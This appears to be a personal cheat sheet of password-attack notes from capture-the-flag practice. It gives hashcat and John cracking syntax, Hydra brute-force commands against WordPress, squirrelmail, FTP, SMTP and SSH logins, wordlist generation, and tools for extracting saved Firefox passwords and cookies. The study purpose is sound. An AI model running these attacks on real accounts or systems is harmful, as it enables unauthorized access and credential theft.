

# Basics
- cracking: from hash
- guessing: from dictionary (loud)
- dump = leaks of passwords/hash
- Combine
  - cat file1 file2 > file3
  - sort fil3 | uniq u > cleaned

# Hashcat
- Identify hash
  - hashid
  - hashidentifier

- wordlist
  - hashcat target /path/to/word/list
- hashcat
  - a 0 = dictionary attack
    - dictionary = list | brute-force = guessing
  - -m 0 = type of hash
  - -a 3 = brute force method
  - ?d = use digit for generating
  - TOTAL_CHARACTERS = generate list

- [Crackstation](https://crackstation.net/)
  
# John
- Using rules
  - john --wordlist=existing_list --rules=pick_one --stdout
  - --format=ENCRYPTION
  - adding rule
    - conf file: [rule_name] Az"[0-9]" ^[!@#$]

# Hydra
- hydra -l username -P wordlist.txt server service
- hydra -l username -P wordlist.txt service://server
- -d = debug
- -v = verbose
- -V = show attempts
  - vV = more info
- -f = terminate if found
- -s = port to connect
- -t = number threadlos

- web
  - hydra -l USERNAME -P WORDLIST_FILEserver *request-method* **"/[PATH_TO_LOGIN]:[body_request]:[F|S]=[ERROR_MESSAGE]"** -vV -f
    - F:failing strings
    - S:sucessfull strings
  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* **"/[request]:username=^USER^&password=^PASS^:F=incorrect"** -v
  
  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* '/login.aspx:BODY_PARAMETER_WITH_PASSWORD:S=logout.php' -f
  
    - Request: *HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy*
    - IP/URL http-get-form | http-post-form "/login-get/index.php:[BODY_CONTENT]&username=^USER^&PASSWORD=^PASS:S=logout.php" -f
    - for post: whole POST BODY
      - S= [message_for_success]
      - F= [message_for_failed]
      - -V Verbose
      - -f = stop attack after finding
      - -L = List of usernames

```
hydra -l Elliot -P /usr/share/wordlists/rockyou.txt.gz $target http-post-form\n'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.134.131%2Fwp-admin%2F&testcookie=1:ERROR: The password you entered for the username elliot is incorrect. Lost your password?'  -f


hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.'\n

```

- FTP
  - hydra -l [USERNAME] -P password.lst ftp://IP

- SMPT
  - -l email@address.com -P [Password_List] smtp://IP -v

- SSH
  - -L [USER_LIST] -P [PASS_LIST] ssh://IP -v

# Brutespray
- Toll that uses result from nmap scan .xml
- [Information here](https://github.com/x90skysn3k/brutespray)

# Creating Wordlists
- cewl URL
  - -w = output
  - -d 5 = depth
  - -m 5 = minimum
  
- username_gennerator.py

- crunch
  - combination of characters
  - crunch 2 2 123456abcd -o output
  - -t startpassword[symbol1][symbol2]
    - @ lower case
    - , upercase
    - % numeric
    - ^ special

- cupp
  - based on information of the target, birthdate, pet, etc
  - https://github.com/Mebus/cupp.git

# Mozillas files
- Files
  - .db
  - logins.json
  - cookies.sqlite
- https://github.com/lclevy/firepwd.git
- https://github.com/unode/firefox_decrypt.git
- msfconsole:
  -  use post/multi/gather/firefox_creds = extract files